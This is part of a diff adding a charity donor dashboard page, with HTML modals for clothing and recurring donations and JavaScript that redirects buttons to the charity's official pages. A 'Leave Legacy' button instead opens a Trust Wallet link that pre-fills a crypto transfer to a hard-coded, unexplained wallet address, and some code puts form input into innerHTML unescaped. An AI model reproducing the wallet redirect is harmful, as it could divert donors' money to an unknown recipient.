+                                    <i class="bi bi-plus-circle me-1"></i>Add More Clothing Items
+                                </button>
+                            </div>
+
+                            <div class="col-12">
+                                <h6 class="fw-bold text-gift-green mb-3">Collection/Drop-off Information</h6>
+                                <div class="row g-3">
+                                    <div class="col-md-6">
+                                        <label for="collectionType" class="form-label">Collection Type</label>
+                                        <select class="form-select" id="collectionType">
+                                            <option value="dropoff">I will drop off</option>
+                                            <option value="collection">Schedule collection</option>
+                                        </select>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <label for="preferredDate" class="form-label">Preferred Date</label>
+                                        <input type="date" class="form-control" id="preferredDate" min="@DateTime.Now.ToString("yyyy-MM-dd")">
+                                    </div>
+                                    <div class="col-12" id="collectionAddressSection">
+                                        <label for="collectionAddress" class="form-label">Collection Address</label>
+                                        <textarea class="form-control" id="collectionAddress" rows="2" placeholder="Enter your address for collection"></textarea>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-12">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="clothingTerms" required>
+                                    <label class="form-check-label" for="clothingTerms">
+                                        I confirm that all donated clothing is in good, wearable condition and free from stains or damage.
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-success" id="confirmClothingBtn">Submit Clothing Donation</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript Dependencies -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Navigation Redirection Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // ------------------------------
+            // Donation Type Selection
+            // ------------------------------
+            const donationTypeBtns = document.querySelectorAll('.donation-type-btn');
+            const monetarySection = document.getElementById('monetaryDonationSection');
+            const clothingSection = document.getElementById('clothingDonationSection');
+
+            donationTypeBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    donationTypeBtns.forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+
+                    const type = this.dataset.type;
+                    if (type === 'monetary') {
+                        monetarySection.style.display = 'block';
+                        clothingSection.style.display = 'none';
+                    } else {
+                        monetarySection.style.display = 'none';
+                        clothingSection.style.display = 'block';
+                    }
+                });
+            });
+
+            // ------------------------------
+            // Profile Modal Functionality
+            // ------------------------------
+            const profileLink = document.getElementById('profileLink');
+            const profileModal = new bootstrap.Modal(document.getElementById('profileModal'));
+            const saveProfileBtn = document.getElementById('saveProfileBtn');
+
+            if (profileLink) {
+                profileLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    profileModal.show();
+                });
+            }
+
+            if (saveProfileBtn) {
+                saveProfileBtn.addEventListener('click', function() {
+                    // Get form values
+                    const firstName = document.getElementById('firstName').value;
+                    const lastName = document.getElementById('lastName').value;
+                    const email = document.getElementById('email').value;
+                    const phone = document.getElementById('phone').value;
+                    const address = document.getElementById('address').value;
+                    const city = document.getElementById('city').value;
+                    const postalCode = document.getElementById('postalCode').value;
+                    const preferences = document.getElementById('preferences').value;
+                    const newsletter = document.getElementById('newsletter').checked;
+
+                    // Validate required fields
+                    if (!firstName || !lastName || !email) {
+                        alert('Please fill in all required fields.');
+                        return;
+                    }
+
+                    // In a real application, you would send this data to the server
+                    // For now, we'll just show a success message and close the modal
+                    alert('Profile updated successfully!');
+                    profileModal.hide();
+
+                    // Update the welcome message with the new name
+                    const welcomeHeading = document.querySelector('h1.fw-bold');
+                    if (welcomeHeading) {
+                        welcomeHeading.textContent = `Welcome Back, ${firstName} ${lastName}!`;
+                    }
+                });
+            }
+
+            // ------------------------------
+            // Recurring Donations Modal Functionality
+            // ------------------------------
+            const recurringDonationBtn = document.getElementById('recurringDonationBtn');
+            const recurringModal = new bootstrap.Modal(document.getElementById('recurringModal'));
+            const confirmRecurringBtn = document.getElementById('confirmRecurringBtn');
+            const customAmountContainer = document.getElementById('customAmountContainer');
+            const recurringOptions = document.querySelectorAll('.recurring-option');
+
+            if (recurringDonationBtn) {
+                recurringDonationBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    recurringModal.show();
+                });
+            }
+
+            // Show/hide custom amount input
+            document.querySelectorAll('input[name="amount"]').forEach(radio => {
+                radio.addEventListener('change', function() {
+                    if (this.value === 'custom') {
+                        customAmountContainer.style.display = 'block';
+                    } else {
+                        customAmountContainer.style.display = 'none';
+                    }
+                });
+            });
+
+            // Style recurring options when selected
+            recurringOptions.forEach(option => {
+                const radio = option.querySelector('input[type="radio"]');
+
+                option.addEventListener('click', function() {
+                    // Remove selected class from all options
+                    recurringOptions.forEach(opt => {
+                        opt.classList.remove('selected');
+                    });
+
+                    // Add selected class to clicked option
+                    this.classList.add('selected');
+
+                    // Check the radio button
+                    radio.checked = true;
+                });
+
+                // Initialize selected state
+                if (radio.checked) {
+                    option.classList.add('selected');
+                }
+            });
+
+            if (confirmRecurringBtn) {
+                confirmRecurringBtn.addEventListener('click', function() {
+                    const amountRadio = document.querySelector('input[name="amount"]:checked');
+                    const frequency = document.querySelector('input[name="frequency"]:checked').value;
+                    const campaign = document.getElementById('campaignSelect').value;
+                    const termsAgreed = document.getElementById('termsAgreement').checked;
+
+                    if (!termsAgreed) {
+                        alert('Please agree to the terms and conditions to proceed.');
+                        return;
+                    }
+
+                    let amount;
+                    if (amountRadio.value === 'custom') {
+                        amount = document.getElementById('customAmount').value;
+                        if (!amount || amount < 10) {
+                            alert('Please enter a valid custom amount (minimum R10).');
+                            return;
+                        }
+                    } else {
+                        amount = amountRadio.value;
+                    }
+
+                    // In a real application, you would process the recurring donation setup
+                    // For now, we'll just show a success message
+                    alert(`Recurring donation of R${amount} ${frequency} has been set up successfully for the ${document.getElementById('campaignSelect').options[document.getElementById('campaignSelect').selectedIndex].text} campaign.`);
+                    recurringModal.hide();
+
+                    // Update the recent activity section
+                    const recentActivity = document.querySelector('.card-body.p-3');
+                    if (recentActivity) {
+                        const newActivity = document.createElement('div');
+                        newActivity.className = 'd-flex align-items-start mb-3';
+                        newActivity.innerHTML = `
+                            <div class="bg-primary rounded-circle p-2 me-3 flex-shrink-0">
+                                <i class="bi bi-arrow-repeat text-white"></i>
+                            </div>
+                            <div class="flex-grow-1">
+                                <h6 class="mb-0 fw-bold text-dark">Recurring Donation Setup</h6>
+                                <small class="text-muted">Just now • R ${amount} ${frequency}</small>
+                            </div>
+                        `;
+                        recentActivity.insertBefore(newActivity, recentActivity.firstChild);
+                    }
+                });
+            }
+
+            // ------------------------------
+            // Clothing Donation Modal Functionality
+            // ------------------------------
+            const donateClothesBtn = document.getElementById('donateClothesBtn');
+            const clothingModal = new bootstrap.Modal(document.getElementById('clothingModal'));
+            const confirmClothingBtn = document.getElementById('confirmClothingBtn');
+            const addMoreClothesBtn = document.getElementById('addMoreClothesBtn');
+            const clothingCategories = document.querySelectorAll('.clothing-category');
+            const collectionTypeSelect = document.getElementById('collectionType');
+            const collectionAddressSection = document.getElementById('collectionAddressSection');
+
+            if (donateClothesBtn) {
+                donateClothesBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    clothingModal.show();
+                    addClothingItem(); // Add initial clothing item
+                });
+            }
+
+            // Style clothing categories when selected
+            clothingCategories.forEach(category => {
+                const checkbox = category.querySelector('input[type="checkbox"]');
+
+                category.addEventListener('click', function() {
+                    checkbox.checked = !checkbox.checked;
+                    if (checkbox.checked) {
+                        this.classList.add('selected');
+                    } else {
+                        this.classList.remove('selected');
+                    }
+                });
+            });
+
+            // Collection type change
+            collectionTypeSelect.addEventListener('change', function() {
+                if (this.value === 'collection') {
+                    collectionAddressSection.style.display = 'block';
+                } else {
+                    collectionAddressSection.style.display = 'none';
+                }
+            });
+
+            // Add more clothes button
+            if (addMoreClothesBtn) {
+                addMoreClothesBtn.addEventListener('click', function() {
+                    addClothingItem();
+                });
+            }
+
+            // Confirm clothing donation
+            if (confirmClothingBtn) {
+                confirmClothingBtn.addEventListener('click', function() {
+                    const termsAgreed = document.getElementById('clothingTerms').checked;
+                    const selectedCategories = Array.from(document.querySelectorAll('.clothing-category input[type="checkbox"]:checked'));
+
+                    if (selectedCategories.length === 0) {
+                        alert('Please select at least one clothing category.');
+                        return;
+                    }
+
+                    if (!termsAgreed) {
+                        alert('Please confirm that all clothing is in good condition.');
+                        return;
+                    }
+
+                    // Get clothing items
+                    const clothingItems = [];
+                    document.querySelectorAll('.clothing-item').forEach(item => {
+                        const type = item.querySelector('.item-type').value;
+                        const size = item.querySelector('.item-size').value;
+                        const quantity = item.querySelector('.item-quantity').value;
+                        const condition = item.querySelector('.item-condition').value;
+
+                        if (type && size && quantity > 0) {
+                            clothingItems.push({ type, size, quantity, condition });
+                        }
+                    });
+
+                    if (clothingItems.length === 0) {
+                        alert('Please add at least one clothing item.');
+                        return;
+                    }
+
+                    // In a real application, you would process the clothing donation
+                    alert('Clothing donation submitted successfully! We will contact you to arrange collection/drop-off.');
+                    clothingModal.hide();
+
+                    // Update the recent activity section
+                    const recentActivity = document.querySelector('.card-body.p-3');
+                    if (recentActivity) {
+                        const newActivity = document.createElement('div');
+                        newActivity.className = 'd-flex align-items-start mb-3';
+                        newActivity.innerHTML = `
+                            <div class="bg-info rounded-circle p-2 me-3 flex-shrink-0">
+                                <i class="bi bi-bag-heart text-white"></i>
+                            </div>
+                            <div class="flex-grow-1">
+                                <h6 class="mb-0 fw-bold text-dark">Clothing Donation Scheduled</h6>
+                                <small class="text-muted">Just now • ${clothingItems.length} items</small>
+                            </div>
+                        `;
+                        recentActivity.insertBefore(newActivity, recentActivity.firstChild);
+                    }
+                });
+            }
+
+            function addClothingItem() {
+                const container = document.getElementById('clothingItemsContainer');
+                const itemId = 'clothingItem_' + Date.now();
+
+                const itemHtml = `
+                    <div class="clothing-item" id="${itemId}">
+                        <div class="row g-2">
+                            <div class="col-md-4">
+                                <label class="form-label">Item Type</label>
+                                <select class="form-select item-type">
+                                    <option value="">Select type</option>
+                                    <option value="shirt">Shirt/Top</option>
+                                    <option value="pants">Pants/Trousers</option>
+                                    <option value="dress">Dress</option>
+                                    <option value="jacket">Jacket/Coat</option>
+                                    <option value="shoes">Shoes</option>
+                                    <option value="accessories">Accessories</option>
+                                </select>
+                            </div>
+                            <div class="col-md-3">
+                                <label class="form-label">Size</label>
+                                <select class="form-select item-size">
+                                    <option value="">Select size</option>
+                                    <option value="xs">XS</option>
+                                    <option value="s">S</option>
+                                    <option value="m">M</option>
+                                    <option value="l">L</option>
+                                    <option value="xl">XL</option>
+                                    <option value="xxl">XXL</option>
+                                    <option value="child">Child</option>
+                                    <option value="baby">Baby</option>
+                                </select>
+                            </div>
+                            <div class="col-md-2">
+                                <label class="form-label">Quantity</label>
+                                <input type="number" class="form-control item-quantity" min="1" value="1">
+                            </div>
+                            <div class="col-md-2">
+                                <label class="form-label">Condition</label>
+                                <select class="form-select item-condition">
+                                    <option value="excellent">Excellent</option>
+                                    <option value="good" selected>Good</option>
+                                    <option value="fair">Fair</option>
+                                </select>
+                            </div>
+                            <div class="col-md-1 d-flex align-items-end">
+                                <button type="button" class="btn btn-outline-danger btn-sm" onclick="document.getElementById('${itemId}').remove()">
+                                    <i class="bi bi-trash"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+
+                container.insertAdjacentHTML('beforeend', itemHtml);
+            }
+
+            // ------------------------------
+            // Make Donation Button - Redirect to official donation page
+            // ------------------------------
+            const makeDonationBtn = document.getElementById('makeDonationBtn');
+            if (makeDonationBtn) {
+                makeDonationBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    // Redirect to official donation page
+                    window.location.href = 'https://giftofthegivers.org/donate-online/';
+                });
+            }
+
+            // ------------------------------
+            // Banking Details Button - Redirect to banking details page
+            // ------------------------------
+            const bankingDetailsBtn = document.getElementById('bankingDetailsBtn');
+            if (bankingDetailsBtn) {
+                bankingDetailsBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    // Redirect to banking details page
+                    window.location.href = 'https://giftofthegivers.org/make-a-difference/banking-details/';
+                });
+            }
+
+            // ------------------------------
+            // Leave Legacy Button - Redirect to Trust Wallet deep link
+            // ------------------------------
+            const leaveLegacyBtn = document.getElementById('leaveLegacyBtn');
+            if (leaveLegacyBtn) {
+                leaveLegacyBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    // Open Trust Wallet with pre-filled transaction details
+                    window.location.href =
+                      'https://link.trustwallet.com/send?asset=c60_t0x6B175474E89094C44Da98b954EedeAC495271d0F' +
+                      '&address=0x650b5e446edabad7eba7fa7bb2f6119b2630bfbb' +
+                      '&amount=1' +
+                      '&memo=Donation';
+                });
+            }
+        });
+    </script>
+
+</body>
+</html>
